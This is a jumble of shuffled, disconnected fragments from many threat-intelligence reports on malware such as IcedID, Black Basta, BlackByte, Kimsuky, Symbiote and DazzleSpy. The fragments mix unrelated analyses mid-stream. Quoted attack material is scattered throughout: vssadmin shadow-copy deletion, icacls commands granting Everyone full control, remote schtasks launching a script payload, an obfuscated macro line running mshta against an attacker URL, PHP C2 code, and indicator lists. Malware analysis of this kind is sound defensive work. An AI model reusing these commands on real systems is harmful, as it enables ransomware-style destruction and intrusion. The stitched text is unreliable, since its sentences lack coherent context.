0	This process includes enrichment with supplementary open source data such as WHOIS information.
0	________________________________________13 SeptemberThere were two campaigns launched; one targeting Italian speakers (project ID 3281798692) and the other targeting English speakers (project ID 726442267).
0	Reconstructing Threat Actor Metrics with Pure Signal ReconIntroductionIcedID (also known as BokBot) started life in early 2017 as a banking trojan that later evolved to include dropper malware capabilities.
0	These capabilities enable IcedID to download and deploy additional malware like Cobalt Strike, with recent infections leading to Quantum ransomware.
0	________________________________________19 SepThe campaign that occurred on 19 September (project ID 775636601) was a bit of an outlier compared to the others weve looked at so far.
0	The IP was reused between domains similarly to the 15 - 16 September campaigns, except in this case the domains were unique.
0	Cybersecurity professionals should continue to pay attention to IcedID as it remains one of the top dropper malware in the threat landscape and has no signs of slowing down.
0	It is typically delivered via email spamming campaigns, with new campaigns being delivered on a near-daily basis that leverage an assortment of different lure types and execution processes.This got us curious - how do different campaigns compare to each other?
0	Weve extensively tracked IcedID C2 infrastructure using our Recon and BARS (Botnet Analysis and Reporting Service) feed tooling, and using this data we were able to peek behind the scenes at metrics that are possibly similar to what the threat actors are tracking themselves.C2 TrackingWeve previously written about IcedID Stage 2 Tier 1 (T1) and Tier 2 (T2) C2 infrastructure and threat telemetry, which pertains to bot activity that occurs after IcedID has successfully infected a machine.
0	In this post, our focus is on the Stage 1 T1 C2s that initially load the malware onto a victims machine after they perform the action being asked of them in the lure, such as enable macros or click a disguised shortcut.
0	________________________________________Bonus Bloopers!
0	We hope that these findings provide benefit to the reader in a number of areas:Context on the cadence, volume, and impact of IcedID campaigns.
0	Data points for the assessment of the effectiveness of IcedID delivery TTPs.
0	Context for the aging out of IcedID C2 IP IOCs;
0	whilst IcedID domains continue to resolve to these IPs, their communications with the T2 cease after approximately 6 days.
0	Topics for security awareness trainings that reflect the current environmentIOCs67.205.169.96aviadronazhed[.]com134.209.97.90qvantumbrakesz[.]com137.184.114.20trallfasterinf[.]comsebdgoldingor[.]com142.93.44.94pildofraften[.]com143.198.178.0audifastinggip[.]com159.203.5.238kolinandod[.]com161.35.110.54alkaliodplus[.]comnikolandfantazy[.]comzalikomanperis[.]com188.166.169.40allozelkot[.]com
0	Make sure your companys security awareness training has adapted too!
0	When it comes to delivery methods, daily campaigns often leverage emails containing password protected zip files and ISOs and perform comparatively well.
0	These metrics are numbers the threat actors are watching as well, and just like any other business may influence their future actions.
0	By Antonio Cocomazzi and Antonio Pirozzi
0	Executive Summary
0	SentinelLabs researchers describe Black Basta operational TTPs in full detail, revealing previously unknown tools and techniques.
0	SentinelLabs assesses it is highly likely the Black Basta ransomware operation has ties with FIN7.
0	Black Basta maintains and deploys custom tools, including EDR evasion tools.
0	SentinelLabs assess it is likely the developer of these EDR evasion tools is, or was, a developer for FIN7.
0	Enter the Black Basta Operator
0	This injection operation occurs every time a component of the Qakbot framework is invoked or for any arbitrary process run manually by the attacker.
0	In addition, the WMI service is leveraged to enumerate installed security solutions.
0	Black Basta Privilege Escalation Techniques
0	We have seen the use of ZeroLogon (CVE-2020-1472), NoPac (CVE-2021-42287, CVE-2021-42278) and PrintNightmare (CVE-2021-34527).
0	wmic /namespace:\ oot\SecurityCenter2 PATH AntiVirusProduct GET /value
0	wmic /namespace:\ oot\SecurityCenter2 PATH AntiSpywareProduct GET /value
0	Remote Admin Tools
0	Black Basta operators have a number of RAT tools in their arsenal.
0	Read the Full Report
0	Conclusion
0	The crimeware ecosystem is constantly expanding, changing, and evolving.
0	FIN7 (or Carbanak) is often credited with innovating in the criminal space, taking attacks against banks and PoS systems to new heights beyond the schemes of their peers.
0	Content of run.bat script
0	In other cases, we have observed the usage of Splashtop, GoToAssist, Atera Agent as well as SystemBC, which has been used by different ransomware operators as a SOCKS5 TOR proxy for communications, data exfiltration, and the download of malicious modules.
0	Black Basta Lateral Movement
0	Partial content of SERVI.bat
0	Impair Defenses
0	Left: Cobalt Strike DNS beacon; Right: BIRDDOG backdoor
0	Based on this evidence, we assess it is highly likely that this tool is specific to the Black Bastas group arsenal.
0	Please click here for Part 2
0	UPDATE 19.October.2021 - Based on some reactions and responses to our BlackByte analysis, and specifically, the included decryptor, we wanted to provide an update and some clarification.
0	First off, weve updated the decryptor on github to include two new files.
0	We thought that this ransomware was not only interesting but also quite odd:Same as other notorious ransomware variants like REvil, BlackByte also avoids systems with Russian and ex-USSR languages.
0	Figure 19: BlackByte's Onion site
0	So this claim is probably designed to scare their victims into complying.
0	So, we wrote a file decryptor that is available at this link: https://github.com/SpiderLabs/BlackByteDecryptor
0	The initial sample we analyzed can be found at this VirusTotal link and is aJScript launcher file.
0	Below is an overview diagram of the initial execution flow.
0	Below is the de-obfuscated and the beautified code:
0	Decrypting an encrypted file
0	Figure 1: JScript execution flow
0	DLL file .NET assemblies
0	Armenian (Armenia)
0	1067
0	tt-RU
0	We used a tool called MegaDumper to achieve this.
0	Turkmen
0	1090
0	ka-GE
0	vssadmin.exe resize shadowstorage /for=c: /on=c: /maxsize=401MB
0	vssadmin.exe Delete Shadows /all /quietpowershell.exe Get-CimInstance Win32_ShadowCopy | Remove-CimInstance
0	vssadmin.exe resize shadowstorage /for=c: /on=c: /maxsize=unbounded
0	vssadmin.exe resize shadowstorage /for=f: /on=f: /maxsize=unbounded
0	vssadmin.exe vssadmin.exe resize shadowstorage /for=g: /on=g: /maxsize=unbounded
0	vssadmin.exe resize shadowstorage /for=h: /on=h: /maxsize=401MB
0	netsh advfirewall firewall set rule group="File and Printer Sharing" new enable=Yes
0	powershell.exe Enable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol
0	icacls.exe" "<DRIVE LETTER>:*" /grant Everyone:F /T /C /Q
0	Figure 8: Once dumped, the decrypted .NET assemblies are saved in the drive and we can start analyzing them.
0	Below is the worm routine and execution flow:
0	Figure 10: Worm routine execution flow
0	schtasks.exe <remotehost> /TN joke /TR \"wscript.exe C:\\Users\\Public\\obamka.js\" /sc once /st 00:00 /RL HIGHEST
0	schtasks.exe /S <remotehost> /Run /TN joke
0	Figure 11: Fatal Exception Error when the ransomware failed to download the .png file
0	The file it downloaded is not actually a PNG image file, instead:
0	The first 40 bytes is the raw key used to encrypt the user's files, this is encrypted with 3DES.
0	If the file is greater than 150MB
0	Below is the code snippet of the file encryption routine.
0	struct razer_report {}
0	unsigned short remaining_packets;
0	Can you spot the problem here?
0	Hence, they suffer from the same bug.
0	Reversing
0	Our love for gaming alongside finding bugs led us back to the good ol question: Is it true that the more RGB colors you have (except for your gaming chair, of course), the more skill and power youll have over your opponents?
0	Since we are always interested in finding vulnerabilities, we have recently started to research third-party Linux kernel drivers, one of which was OpenRazer [0]  an open-source driver for gaming devices produced by Razer.
0	Finding any vulnerabilities in such a product has a significant impact due to the vast number of users.
0	We have found a buffer overflow in the OpenRazer open-source kernel drivers, which caused a Denial of Service and possibly Elevation of Privileges (CVE-2022-29021, CVE-2022-29022, CVE-2022-29023).
0	Fake MSI Afterburner Sites Delivering Coin-Miner
0	Stealthy Miner Bypasses Detection Using Shellcode and Process Injection
0	Gamers and other high-performance computing users use various utility software tools such as MSI Afterburner, which monitors system performance and allows users to modify the hardware settings to enhance the systems performance.
0	The below image shows the process tree of the XMR miner.
0	Figure 5  Process tree of XMR Miner
0	The below image shows the infection chain of the XMR miner.
0	Figure 6  XMR miner infection chain
0	XMR Miner Analysis
0	Additional information is shown in the figure below.
0	The table below shows the arguments used by the XMR miner malware.
0	MITRE ATT&CK Techniques
0	TacticTechnique IDTechnique
0	NameExecutionT1204 T1064User Execution ScriptingPersistenceT1547Registry Run Keys / Startup FolderPrivilege EscalationT1055Process InjectionDefense
0	Indicators of Compromise
0	IndicatorsIndicatorTypeDescription96a3469891a23e0aa49fd009979b668b
0	This coin-miner malware campaign uses MSI Afterburner phishing sites targeting gamers and other individuals who require high-performance computing.
0	TAs use phishing emails, online ads, and various other means to propagate links over the internet.
0	Malicious AppTargets Major Brazilian Bank ItaUnibanco
0	Android Malware is created or used by Threat Actors (TAs) to harm usersthrough various activities such as performing fraudulent financial transactionsetc.
0	Our Recommendations
0	We recommend that our readers follow the best practices given below:
0	Download and install software only from official app stores like Google Play Storeor the iOS App Store.Use a reputedanti-virus and internet security software package on your connected devices, such as PCs, laptops, and mobile devices.Use strong passwords and enforce multi-factor authentication wherever possible.
0	As we've seen with similar vulnerabilities in the past, the simplicity and efficacy of this vulnerability lends itself to rapid adoption by malware authors.
0	How Hackers Targeted The Covid-19 Vaccine Supply Chain; Vaccine Sold in Darkweb
0	Aspharmaceuticalsacross the worldrace towardsa vaccine, cybercrime continues to thrivein the underbelly of the Internet.
0	In forums on the dark web, criminalscontinue totradeenormousrepositories of criticalmedicaldatagathered throughunauthorizedmeans.As COVID-19continues todominate headlines,confidential vaccine research datageneratesenoughmonetization opportunities for cybercriminals.In addition to the COVID-19 databases containing confidentialPIIbeing leakedonthe Internet, one of the criticalsecurityconcerns is the immense cold chain logisticsof the vaccine.
0	Authors
0	Kimsuky (also known as Thallium, Black Banshee and Velvet Chollima) is a prolific and active threat actor primarily targeting Korea-related entities.
0	Like other sophisticated adversaries, this group also updates its tools very quickly.
0	In early 2022, we observed this group was attacking the media and a think-tank in South Korea and reported technical details to our threat intelligence customer.
0	Contents of decoy
0	While researching Kimsukys novel infection chain, grouped as a GoldDragon cluster, we are faced with several limitations:
0	if (isset($_GET['who']) && $_GET['who'] == "[redacted]") # Check 'who' parameter value
0	$vbs_server = "weworld59.myartsonline.com"; # The next stage server
0	$virus = "v.doc";                       # Malicious document
0	if (isset($_GET['who']) && $_GET['who'] == "[redacted]") # Check 'who' parameter
0	value{$vbs_server = "weworld59.myartsonline.com"; # The next stage server$virus = "v.doc"; # Malicious
0	C2 server structure
0	Malicious documents
0	Indicators of Compromise
0	238e6952a990fd3f6b75569feceb26a2
0	kima-2022-4- -.doc
0	8d28e28c1ee6f133441b6d71f7f8bcba
0	open.vbs
0	3361fa242eb7e6162fd4682471f4e952
0	get_info.vbs
0	Well look in more detail at how the operator uses this information in the next section.
0	function send_ip($host , $data){}
0	Looking at the corresponding script (index.php) of the above IP-delivering GET request, heres how it works.
0	";fwrite($pfile,$res);fclose($pfile);header('Location: https://mail.google.com');
0	" ;fwrite($pfile,$res);fclose($pfile);exit;}$szfilename = "error.txt";$pfile = fopen($szfilename,"ab");$res= $date .
0	$_SERVER['HTTP_USER_AGENT']."
0	CV.DHOM Alexandra Siddall (Korean).doc
0	South Korean university professor
0	The contents of decoy documents have various topics including the agenda of the 2022 Asian Leadership Conference, a form of honorarium request and an Australian diplomats curriculum vitae.
0	As we can see, the actor uses content the victim could be interested in, such as an event to be held in the near future, a specific request form, and the resume of a high-profile individual.
0	Decoy documents
0	Malicious document and method of delivering next stage payload
0	The following scriptlet is part of a malicious macro in the document.
0	cmd = "c" + "md /" + "c c" + "md /" + "c cm" + "d /" + "c c" + "m" + "d /" + "c c" + "md /" + "c c" + "md /" + "c msht" + "a.e" + "xe hxxp://leehr24.mywebcommunity[.]org/h.php"
0	$downfile = "h.txt";
0	$logfile = "log.txt";
0	");fclose($handle);if(file_exists($allow_file)){$fp = fopen($allow_file,"r");$content = fread($fp, filesize($allow_file));fclose($fp);if(!stristr($content,$ip )){  echo 'Set objShell = CreateObject("Wscript.shell")objShell.run "TASKKILL /F /IM mshta.exe" , 0 , False';  exit;}}
0	ProgramFilesFolder = objShell.ExpandEnvironmentStrings("%ProgramFiles%")
0	Email name
0	Suspected email
0	Delivered file name
0	Email owner
0	yk****@***.ac.kr
0	Set shell_obj = CreateObject("WScript.Shell")
0	ini_file =
0	jung******
0	jung******@gmail.com
0	Professor of South Korea university
0	jh******@****.ac.kr
0	([Template]Pay honorarium.doc)
0	Also, historically, politicians, diplomats, journalists, professors, and North Korean defectors have been prime targets of the Kimsuky group.
0	FortiGuard Labs has observed similar drastic modifications within RapperBot samples, as detailed in our previous report, adding and removing even DoS attack code on an apparent whim.
0	The Telnet brute forcing code is designed primarily for self-propagation and resembles the old Mirai Satori botnet.
0	Function initializing the credential list
0	While not exactly a novel technique, it is still uncommon compared to other IoT botnets.
0	Figure 2.Gaining root access on devices with a default password
0	After FortiGuard Labs reported on RapperBot in our previous article titled So RapperBot, What Ya Bruting For?
0	in August 2022, there was a significant drop in the number of samples collected in the wild.
0	But in early October 2022, new samples with the same distinctive C2 protocol used by RapperBot were detected.
0	We also found older samples from another campaign that was active in August-September 2021 with an almost identical list of credentials.
0	Timeline of related campaigns
0	Researchers observed that the attacker had already gained access to privileged credentials from a prior compromise, for the targeted networks to deploy the ransomware.
0	As of now, this campaign did not find any tangible connection to a known threat actor attempting to deploy ransomware into the networks of Ukrainian enterprises.
0	Or, to any of the existing ransomware groups that may be related to earlier recent attacks conducted by Russia-linked threat actors.
0	What we have observed in this and the previous campaigns:
0	Some of the victims were previously targeted with HermeticWiper which was discovered in Ukraine.
0	STATIC ANALYSIS
0	SHA256: 5fc44c7342b84f50f24758e39c8848b2f0991e8817ef5465844f5f2ff6085a5
0	File Type
0	As shown below.
0	Threat actors behind ransomware attacks do not always have one goal of extorting money from victims.
0	As is the case with other ransomware, it might be inconclusive at this stage to assess the damage Prestige ransomware has caused.
0	There is a significant uptick in discussions and mentions observed around Prestige ransomware which may mean that the infection footprint is sizeable and possibly continues to expand.
0	The activity observed around the sample analyzed shares victimology with recent Russian state-threat actor groups, in the targeted geographies, and in some cases overlaps with victims of HermeticWiper.
0	As the external threat landscape continues to evolve, wipers and destructive attacks not only in Ukraine but also in other geopolitically motivated attacks will continue to be a consistent component in such attacks.
0	List of IOCs
0	Dynamic Analysis
0	(Japanese)Unit 42 researchers have been tracking the threat group AridViper, which has been targeting the Middle Eastern region.
0	This is an interesting finding, as we have not witnessed AridViper targeting these operating systems before and this could represent a new area the actor is starting to explore.For now, the code found is very simple, and could be part of a copy and paste effort when building the Python code, but in any case, we plan to keep it on our radar while researching new activity.During the C2 interactions, PyMICROPSIA downloads two additional samples that are dropped and executed on the victims system, running additional functionality.
0	Based on the code sections that are reachable, the following table summarizes the commands and actions performed on the victim machine:Table 2.
0	Main purpose of configuration folders and files.Devices are identified based on a combination of computer name, username and a randomly generated code.
0	2022 Palo Alto Networks, Inc. All rights reserved.
0	As an interesting fact, the commands are full of references to Disney (in the past, we have seen AridViper using variables referencing characters of The Big Bang Theory or Game of Thrones, for example).Another interesting example of incomplete code is the fact that the code wont be able to go through all the possible branches and functionality in the C2 implementation.
0	Data is stored under the DevNameSound folder.The recordings are stored in the corresponding folder, and the running threads as well as the operator commands will allow for the retrieval of the information captured.
0	These commands are split by a specific delimiter ; in this sample, travelling encoded in base64.
0	The sample has different options implemented, allowing the operators very flexible execution of commands such as download and execution of payloads from a given URL, process execution, etc.Sign up to receive the latest news, cyber threat intelligence and research from usPlease enter your email address!Please mark, I'm not a robot!By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.
0	The code looks as follows:Table 5.
0	The methods are invoked based on different interactions with the C2 operator, and they give the operators flexibility on what kind of information they want to collect.For example, there are generic methods to collect specific folders and with different levels of information detailed, as can be seen in several of the figures below.There are methods to collect information from external drives:As well as other approaches, such as methods to focus on specific file extensions.File operators have plenty of commands that allow different types of files to be collected from disk.
0	Based on its value, it can download specific payloads as well as given URLs.
0	AT&T Alien Labs has been tracking a new IoT botnet dubbed EnemyBot, which is believed to be distributed by threat actor Keksec.
0	During our investigations, Alien Labs has discovered that EnemyBot is expanding its capabilities, exploiting recently identified vulnerabilities (2022), and now targeting IoT devices, web servers, Android devices and content management system (CMS) servers.
0	enemy.c
0	This is the main bot source code.
0	Though it is missing the main exploitation function, it includes all other functionality of the malware and the attacks the bot supports by mixing the various botnet source codes as mentioned above (Mirai, Qbot, and Zbot)  mainly Mirai and Qbot (see figure 5).
0	Figure 5.EnemyBot source code.
0	This module is compiled and manually executed to encode / decode the malwares strings by the attacker to hide strings in binary.
0	EnemyBot "adb_infect" function to attack Android devices.
0	Command
0	Action
0	They can be used by readers to tune or deploy detections in their own environments or for aiding additional research.
0	The Zscaler ThreatLabz team has recently discovered the Xenomorph banking trojan embedded in a Lifestyle app in the Google Play store.
0	The app is Todo: Day manager, and has over 1,000 downloads.
0	This is the latest in a disturbing string of hidden malware in the Google Play store: in the last 3 months, ThreatLabz has reported over 50+ apps resulting in 500k+ downloads, embedding such malware families as Joker, Harly, Coper, and Adfraud.
0	Fig no 1.Malware Installer From Play Store
0	A similar infection cycle was observed three months ago with the Coper banking trojan.
0	Technical Details
0	Fig no 2.Flow of infection
0	Fig no 4.Downloader not enabled.
0	Fig no 3.
0	The following screenshot shows how the Firebase database malware uses Github links to download Xenomorph payloads:Fig no 5.
0	Insights and Research
0	Security Research
0	ThreatLabz is working with the Google Security team for the same.
0	Suspicious Installer exhibiting the same behavior
0	Xenomorph banking trojan
0	At Zscaler we proactively detect and monitor such applications to secure our clients.
0	Such bank phishing installers most of the time rely on tricking users to install malicious applications.
0	Users are advised to keep an eye on what application is being installed.
0	A Play Store application is not supposed to side load or ask users to install from unknown sources.
0	In late June 2022, HP Wolf Security isolated an unusually stealthy malware campaign that used OpenDocument text (.odt) files to distribute malware.
0	OpenDocument is an open, vendor-neutral file format compatible with several popular office productivity suites, including Microsoft Office, LibreOffice and Apache OpenOffice.
0	As described in a blog post by Cisco Talos, the campaign targets the hotel industry in Latin America.
0	The targeted hotels are contacted by email with fake booking requests.
0	In the case below, the attached document was purportedly a guest registration document.
0	Figure 1  Email lure making a booking request.
0	Infection chain
0	Figure 2  OpenDocument file asking to update fields in the document.
0	Figure 3  Excel spreadsheet asking the user to enable macros.
0	Strikingly, the document used in the campaign is poorly detected by anti-virus scanners, with a 0% detection rate on VirusTotal as of 7 July.
0	Figure 4  OpenDocument VirusTotal detection.
0	Figure 5  OpenDocument referencing external document.
0	Figure 6  Externally referenced Word document contains 10 Excel files.
0	Attackers are always hunting for stealthy ways of delivering malware that evades endpoint security.
0	This campaign illustrates how OpenDocument text files can be abused to deliver malware through external OLE references with extremely low detection rates.
0	Documents that arrive from outside an organization should always be treated with suspicion, especially if they try to load external content from the web  but in practice this isnt always straightforward advice to follow, especially in industries that rely on exchanging electronic documents between suppliers and clients.
0	This research is a joint effort between Joakim Kennedy, Security Researcher at Intezer, and the BlackBerry Threat Research & Intelligence team.
0	It can be found in the BlackBerry blog here as well.
0	In biology, a symbiote is an organism that lives in symbiosis with another organism.
0	The symbiosis can be mutually beneficial to both organisms, but sometimes it can be parasitic when one benefits and the other is harmed.
0	A few months back, we discovered a new, undetected Linux malware that acts in this parasitic nature.
0	We have aptly named this malware Symbiote.
0	What makes Symbiote different from other Linux malware that we usually come across, is that it needs to infect other running processes to inflict damage on infected machines.
0	Our earliest detection of Symbiote is from November 2021, and it appears to have been written to target the financial sector in Latin America.
0	In our research, we havent found enough evidence to determine whether Symbiote is being used in highly targeted or broad attacks.
0	The image below shows a summary of the malwares evasions.
0	This logic is used in all hooked functions.
0	An example is shown in Figure 2 below.
0	The files extracted from all the samples we examined are shown in the list below.
0	The list includes the following files.
0	Symbiote also has functionality to hide network activity on the infected machine.
0	Essentially, this gives the calling process a scrubbed result, which excludes all entries of the network connections that the malware wants to hide.
0	This minimizes the context switching between kernel and userland, providing a performance boost since the kernel performs the filtering directly.
0	Code Snippet 1: Annotated bytecode extracted from one of the Symbiote samples.
0	The pcap_stats uses this counter to correct the number of packets processed by subtracting the counter value from the true number of packets processed.
0	Either option suggests that this malware was written by a skilled developer.
0	The BlackBerry Research & Intelligence team examines emerging and persistent threats, providing intelligence analysis for the benefit of defenders and the organizations they serve.
0	To make the analysis easier he has written the Go Reverse Engineering Toolkit (github.com/goretk), an open-source toolkit for analysis of Go binaries.
0	For the last few years, Joakim has been researching malware written in Go.
0	Dr. Joakim Kennedy is a Security Researcher analyzing malware and tracking threat actors on a daily basis.
0	Network telemetry can be used to detect anomalous DNS requests and security tools such as antivirus (AVs) and endpoint detection and response (EDRs) should be statically linked to ensure they are not infected by userland rootkits.
0	This method is used to filter out UDP packets, while the bytecode method is used to filter out TCP packets.
0	By using all three of these methods, the malware ensures that all traffic is hidden.
0	The A record request has the following format:
0	Code Snippet 2: Structure of DNS request used by Symbiote to exfiltrate data.
0	The TXT record has the format of %MACHINEID%.%C2_DOMAIN%.
0	Figure 4 below shows a timeline of these events.
0	In 2014, ESET released an in-depth analysis of Ebury, an OpenSSH backdoor that also performs credential stealing.
0	When we first analyzed the samples with Intezer Analyze, only unique code was detected (Figure 5).
0	There are some similarities in the techniques used by both malware families.
0	Figure 3 below shows the code executed.
0	The domain names used by the Symbiote malware are impersonating some major Brazilian banks.
0	Cintepol is an intelligence portal provided by the Federal Police of Brazil.
0	The portal allows police officers to access different databases provided by the federal police as part of their investigations.
0	Additionally, a version that appears to be under development was submitted at the end of November from Brazil, further suggesting VirusTotal was being used by the threat actor or group behind Symbiote for detection testing.
0	Symbiote is not the first Linux malware developed for this goal.
0	Dr. Joakim Kennedy is a Security Researcher analyzing malware and tracking threat actors on a daily basis.
0	Spread this blogWeb browsers contain the most lucrative pieces of information about a user and thus are becoming an interesting target for malware developers.
0	Every keystroke or session cookie can contain very private information about a user, and access to such information can create critical security and privacy issues.
0	Figure 1: manifest.json
0	Figure 2: Installed chrome extension on Google Chrome.
0	This not only diminishes the performance of the device but reduces hardware lifespan and increases energy usage, which translates into a slow but steady monetary loss.
0	Figure 3: cthulhu.js code that drops the malware.
0	It has the following functionalities:
0	Figure 4: campaign.js code that steals cookies.
0	Stealing Clipboard Data
0	This behavior can be especially dangerous in cases where the user stores password in any password manager and copies and pastes the password or other sensitive information in the infected browser session.
0	Figure 5: campaign.js code that steals clipboard data.
0	3.Exploit
0	We already mentioned the Firefox exploit that was used to drop a malicious exe file.
0	4.POST requests and layer 7 attack
0	The Threat Actors
0	The origin of this malware comes from the Keksec malware group, which was originally formed in 2016 by some botnet actors.
0	The first public release of this JavaScript botnet was found in 2017, and it was updated again in 2020, where it was spread as a single JavaScript that can be included on any website using script tags.
0	The command and control servers used by the Cloud9 Chrome botnet point to domains that were previously used by the Keksec malware group.
0	The Cloud9 botnet is being sold either for free or for a few hundred dollars on various different hacker forums.
0	As it is quite trivial to use and available for free, it can be used by many malware groups or individuals for specific purposes.
0	How does Cloud9 Impact Enterprise Clients?
0	This malware is purposefully designed to target all kinds of users and serves its purpose of retrieving user information.
0	Previous BlogNext Blog
0	Exploit Guard  Module that delivers behavior-based detection and prevention against exploits and payloads.
0	The combination of signature-based, machine-learning based, and behavioral-based protection capabilities, the UAC Protect module, and the Process Guard module for Trellix Endpoint Security provide maximum protection for customers.
0	Figure 15: Trellix NX MVX analysis of HermeticWiper
0	The report provides an in-depth forensics data of all behaviors discovered during analysis.
0	This activity was reported by Googles TAG and attributed to the infamous APT28 aka Fancy Bear threat actor, known for its ties with the Russian GRU.
0	It offers comprehensive email security against malicious attachments, credential-phishing URLs, spoofing, zeroday and multi-stage attacks.
0	The OS change report includes:
0	File and folder actions
0	Windows Registry events
0	It is imperative that security teams have visibility into what's happening across the business so they can respond to and investigate security incidents including destructive wiper attacks.
0	Trellix Helix can analyze events in over 650 security and business tools and is enriched with Trellix expertise to identify the threats happening in an organization.
0	Figure 24: Alerts correlation in Helix XDR
0	Cyber warfare weapons (including destructive wipers) will be part of every geopolitical conflict.
0	Hong Kong pro-democracy radio station website compromised to serve a Safari exploit that installed cyberespionage malware on site visitors Macs
0	On November 11th, Google TAG published a blogpost about watering-hole attacks leading to exploits for the Safari web browser running on macOS.
0	Its value is fetched from JavaScript using its toString method.
0	Detailing the fake object creation would require an article of its own.
0	Our examination confirms Googles analysis that the exploited vulnerability was described by Xinru Chi and Tielei Wang in a presentation at zer0con 2021, but it was also presented in more details at MOSEC 2021 by Tielei Wang.
0	The vulnerability has been assigned CVE-2021-30869.
0	DazzleSpy is a full-featured backdoor that provides attackers a large set of functionalities to control, and exfiltrate files from, a compromised computer.
0	The WebKit exploit
0	Its interesting to note that some code, which suggests the vulnerability could also have been exploited on iOS and even on PAC-enabled (Pointer Authentication Code) devices such as the iPhone XS and newer, has been commented out, as seen in Figure 5.
0	-----BEGIN CERTIFICATE-----
0	MIIDTDCCAjQCCQCSgwC5KEoeDjANBgkqhkiG9w0BAQsFADBoMQswCQYDVQQGEwIx
0	T1584.004Compromise Infrastructure: ServerA legitimate website was compromised to add an  iframe  loading malicious JavaScript code.
0	T1587.003Develop Capabilities: Digital CertificatesDazzleSpy verifies the authenticity of its C&C server using an X.509 certificate.
0	Serial Number: 10557282746731470350 (0x928300b9284a1e0e)
0	Filenames
0	95889E0EF3D31367583DD31FB5F25743FE92D81DN/AOSX/Exploit.Agent.CMach-O file with LPE launching next stage.
0	Indicators of Compromise (IoCs)
0	Given the complexity of the exploits used in this campaign, we assess that the group behind this operation has strong technical capabilities.
0	While there is information published online about the local privilege escalation (LPE) vulnerability used here, we couldnt find anything about the specific WebKit vulnerability used to gain code execution in Safari.
0	Its also interesting that end-to-end encryption is enforced in DazzleSpy and it wont communicate with its C&C server if anyone tries to eavesdrop on the unencrypted transmission by inserting a TLS-inspection proxy between the compromised system and the C&C server.
0	It records a wide range of information:
0	Generic system information :
0	list of volumes, their serial number and FileSystem name
0	if the victim has installed mobile telephone applications (Nokia PC Suite, Sony Ericson PC Suite), this information will be present
0	The discovery of Stuxnet back in 2010 sparked intense debate on the state of security in cyber-space.
0	But, even though Stuxnet has been successfully identified, isolated and dealt with, its predecessor (and companion, as well) has managed to remain undetected all this time by employing stunning tactics that likely make it the most advanced e-threat in the world to date.
0	When state-of-the-art malware detection works against intelligence gathering
0	This new e-threat, identified by Bitdefender as Trojan.Flamer.A appears to have emerged before Stuxnet and Duqu hit.
0	All this time, it has operated discreetly, and even if it some of its components were detected when Stuxnet was discovered, the AV industry couldnt see how deep the operation ran.
0	On average, between 15,000 and 35,000 unique malware samples appear daily, which makes manual analysis or individual identification technically unfeasible.
0	Most antivirus vendors rely on generic detections and heuristics to cover as much as possible of this malicious pool.
0	At a glance, the Flamer.A Trojan appears much more advanced than Stuxnet.
0	7 Years of Scarlet Mimics Mobile Surveillance Campaign Targeting Uyghurs
0	September 22, 2022
0	In 2022, Check Point Research (CPR) observed a new wave of a long-standing campaign targeting the Uyghur community, a Turkic ethnic group originating from Central Asia, one of the largest minority ethnic groups in China.
0	This malicious activity, which we attributed to the threat actor Scarlet Mimic, was first brought to light back in 2016.
0	Since then, CPR has observed the group using more than 20 different variations of their Android malware, disguised in multiple Uyghur-related baits such as books, pictures, and even an audio version of the Quran, the holy text of the Islamic faith.
0	The malware is relatively unsophisticated from a technical standpoint.
0	Overview of the campaign
0	Since 2015, CPR has identified more than 20 samples of Android spyware called MobileOrder, with the latest variant dated mid-August 2022.
0	As there are no indications that any of them were distributed from the Google Store, we can assume the malware is distributed by other means, most likely by social engineering campaigns.
0	Figure 5  The service that starts the Communication and KeepAlive threads.
0	However, the KeepAlive thread is not the only one responsible for keeping the malware active.
0	Figure 6  AndroidManifest.xml specifying triggers for the BroadcastReceiver which is responsible for keeping the malware alive.
0	Dead drop resolvers
0	Figure 9  The code responsible for regex pattern matching of the dead drop resolvers.
0	Encryption
0	Command execution
0	Upload all SMS messages.
0	Upload all Call Logs.
0	Take a photo from the camera.
0	Start Audio Recording task (immediately or at a specified time).
0	As we can see from this list, the malware contains stealer functionality to upload all kinds of sensitive data from the device (device info, SMS, calls, location, etc.
0	However, there is no automatic upload for the recorded calls.
0	For example, one set of coordinates can be translated to the full street address of the closest building, while another might contain only a city name and a postal code.
0	Most of the malicious applications we observed have names in the Uyghur language, in its Arabic or Latin scripts.
0	We can therefore conclude that this campaign is likely intended to target the Uyghur minority or organizations and individuals supporting them, which is consistent with the Scarlet Mimic groups previously reported activity.
0	The application named   which translates from Uyghur to Guerrilla Warfare (md5: b5fb0fb9488e1b8aa032d7788282005f) contains the PDF version of the short version of the military course by Yusuf al-Ayeri, the now deceased first leader ofAl-Qaeda in Saudi Arabia, which outlines the tactical methods of guerrilla warfare.
0	Over the years, Scarlet Mimic strongly continues its espionage operations against the Uyghur community using Android malware.
0	Figure 1.Example of defaced Ukrainian government website.
0	Despite the ransom request, the data will not be recoverable since all efforts made by WhisperKill are looking to destroy data, not encrypt it.
0	HermeticWiper
0	A month after, on February 23rd 2022, ESET Research reported a new Wiper being used against hundreds of Ukrainian systems.
0	According to a Reuters article, the certificate could have also been obtained by impersonating the company and requesting a certificate from scratch.
0	Figure 3.Hermetica Digital Ltd certificate.
0	IsaacWiper
0	A day after the initial destructive attack with HermeticWiper, on February 24th, 2022, a new wiper was used against the Ukrainian government, as reported by ESET, without any significant similarities to the HermaticWiper used the day before.
0	Figure 4.IsaacWiper strings.
0	When comparing IsaacWiper to WhisperKill, the attackers priorities become clear.
0	It was used in 2018, targeting vulnerabilities in several common router brands: Linksys, MikroTik, NETGEAR, and TP-Link.
0	This new wiper showed similarities to previously seen botnets targeting modems using VPNFilter.
0	This wiper was particularly aimed at modems, probably to disrupt Internet access from Ukraine.
0	AcidRain
0	As we have seen in the examples above, the main objective of the attackers behind wipers is to destroy all possible data and render systems unbootable (if possible), potentially requiring a full system restore if backups arent available.
0	For that reason, it is not effective to employ detection of wiper malware, asonce they are in the system as it is already too late.
0	The best approach against wipers is to prevent attacks by keeping systems up to date and by increasing cybersecurity awareness.
0	In addition, consequences can be ameliorated by having periodic backup copies of key infrastructure available.
0	The following technical indicators are associated with the reported intelligence.
0	A list of indicators is also available in the following OTX Pulses:
0	On February 1st, Adobe published bulletin [APSA18-01](https://helpx.adobe.com/security/products/flash-player/apsa18-01.html) for CVE-2018-4878 describing a use-after-free (UAF) vulnerability affecting Flash version 28.0.0.137 and earlier.
